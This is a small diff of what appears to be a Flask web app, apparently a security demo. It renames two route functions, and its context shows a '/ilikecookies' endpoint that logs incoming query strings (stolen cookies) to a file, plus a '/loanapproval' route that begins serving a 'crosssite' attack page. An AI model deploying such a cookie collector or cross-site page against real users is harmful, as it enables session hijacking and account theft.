@@ -29,7 +29,7 @@ def dumpdata():
 
 
 @app.route('/ilikecookies')
-def recorddata():
+def ilikecookies():
     data = request.query_string.decode('unicode-escape') + ' ' + strftime("%Y-%m-%d %H:%M:%S", gmtime()) + '\n'
     file = open("/tmp/cookiedata.txt","a")
     file.write(data)
@@ -43,7 +43,7 @@ def whoami():
 
 
 @app.route('/loanapproval')
-def freejuice():
+def loanapproval():
     crosssite='''<!DOCTYPE html>
  <html> 
      <head> 
